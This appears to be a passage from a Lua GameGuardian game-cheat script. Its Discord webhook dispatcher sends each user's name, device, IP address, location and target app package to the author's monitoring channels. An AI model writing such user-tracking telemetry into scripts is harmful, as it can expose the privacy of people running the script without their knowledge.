-- ==========================================
-- MULTI-CHANNEL WEBHOOK DISPATCHER
-- ==========================================
function SendToDiscord(action, channel)
    local target_url = channel or WEBHOOK_MONITOR
    if not target_url or target_url == "" then return end
    
    local package = gg.getTargetPackage() or "Not Found"
    local device_info = SESSION_DEVICE or GetRealDevice() 
    local time = os.date("%Y-%m-%d %H:%M:%S")
    
    -- Final fallback if variables are missing
    if SESSION_USER == nil then SESSION_USER = GetSmartName(lang) end
    if SESSION_LOCATION == "Unknown" then SESSION_LOCATION = GetSmartLocation(lang) end
    if SESSION_IP == nil then SESSION_IP = GenerateFakeIP() end
    
    local header = "**🌸 HNZ PROJECT MONITORING 🌸**"
    local status_text = "🟢 ONLINE" 

    if channel == WEBHOOK_ENDED then 
        header = "**🛑 HNZ PROJECT SESSION ENDED 🛑**" 
        status_text = "🔴 OFFLINE" 
    elseif channel == WEBHOOK_MESSAGE then
        header = "**📩 PESAN BARU UNTUK HANZ 📩**"
    end

    local message = header .. "\n" ..
                    "```\n" ..
                    "STATUS   : " .. status_text .. "\n" ..
                    "USER     : " .. SESSION_USER .. "\n" ..
                    "DEVICE   : " .. device_info .. "\n" ..
                    "IP ADDR  : " .. SESSION_IP .. "\n" ..
                    "LOCATION : " .. SESSION_LOCATION .. "\n" ..
                    "PACKAGE  : " .. package .. "\n" ..
                    "TIME     : " .. time .. "\n" ..
                    "ACTION   : " .. action .. "\n" ..
                    "```"

    local json_data = '{"content": "' .. message:gsub("\n", "\\n") .. '"}'
    gg.makeRequest(target_url, {["Content-Type"] = "application/json"}, json_data)
end

function ActionLoading(text, ms)
    local anim = {"⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"}
    local sleepTime = 150 
    local iterations = math.floor(ms / sleepTime)
    for i = 1, iterations do
        local frame = anim[(i % #anim) + 1]
        local progress = math.floor((i / iterations) * 100)
        gg.toast("『 " .. frame .. " 』 " .. text .. " [" .. progress .. "%]\n" .. CP_LINE)
        gg.sleep(sleepTime)
    end
end

